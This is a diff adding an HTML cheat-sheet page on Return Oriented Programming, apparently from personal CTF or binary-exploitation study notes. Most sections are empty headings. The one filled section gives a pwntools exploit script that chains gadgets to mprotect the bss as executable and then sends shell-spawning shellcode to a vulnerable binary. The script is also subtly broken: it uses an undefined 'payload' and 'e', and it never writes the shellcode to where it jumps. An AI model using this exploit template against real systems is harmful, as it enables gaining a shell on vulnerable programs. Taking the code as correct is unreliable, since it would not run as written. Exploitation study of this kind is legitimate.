@@ -1,0 +1,77 @@
+<html>
+    <head>
+        <title>ROP</title>
+        <link rel="icon" type="image/x-icon" href="../Images/hacker.jpg">
+        <link rel="stylesheet" href="../styles/tokyo-night-dark.min.css">
+        <link rel="stylesheet" href="../styles/styles.css">
+        <script src="../styles/highlight.min.js"></script>
+        <script>hljs.highlightAll();</script>
+
+    </head>
+    <body>
+
+
+        <div class="sidenav">
+            <a href="#overview">Overview</a>
+            <div class="sidenav-sublist">
+                <a href="#pwn-tools">Pwntools Template</a>
+            </div>
+            <a href="#tools">Gadget Tools</a>
+            <a href="#ret2libc">ret2libc</a>
+            <a href="#mprotect">mprotect</a>
+        </div>
+        
+        <div class="main">
+            <h1>Return Oriented Programming</h1>
+            <hr>
+            <h2>Overview</h2>
+            <h3>Pwntools template</h3>
+            <hr>
+            <h2>ret2libc</h2>
+            <hr>
+            <h2 id="mprotect">mprotect</h2>
+            <hr>
+            When to use: 
+            <ol>
+                <li>When a binary is <u>statically linked</u></li>
+                <li><b>NX is enabled</b> and there is <b>no PIE</b></li>
+                <li>When you have an <b>out-of-bounds (OOB)</b> write</li>
+            </ol>
+            Example:
+            <pre><code class="language-python">#!/usr/bin/python3
+from pwn import *
+import warnings
+import os
+warnings.filterwarnings('ignore')
+context.arch = 'amd64'
+context.log_level = 'critical'
+
+binary = "./vulnerable"
+elf = ELF(binary)
+rop = ROP(elf)
+
+# mprotect the bss to make it executable
+# int mprotect(void addr[.size], size_t size, int prot);
+payload += p64(rop.rdi[0])
+payload += p64(elf.bss())   # addr = &bss
+payload += p64(rop.rsi[0])
+payload += p64(0x1000)      # size = page size
+payload += p64(rop.rdx[0])
+payload += p64(0x7)         # prot = PROT_READ | PROT_WRITE | PROT_EXEC
+payload += p64(elf.sym.mprotect)    # mprotect must be statically linked
+
+# run shellcode
+off = 0x200     # bss offset where the shellcode will be
+payload += p64(e.bss(off + 1))
+
+with process(binary) as r:
+    r.send(payload)
+    r.sendline(asm(shellcraft.sh()))
+    print("Starting shell")
+    r.interactive()
+            </code></pre>
+           
+        </div> 
+
+    </body>
+</html>
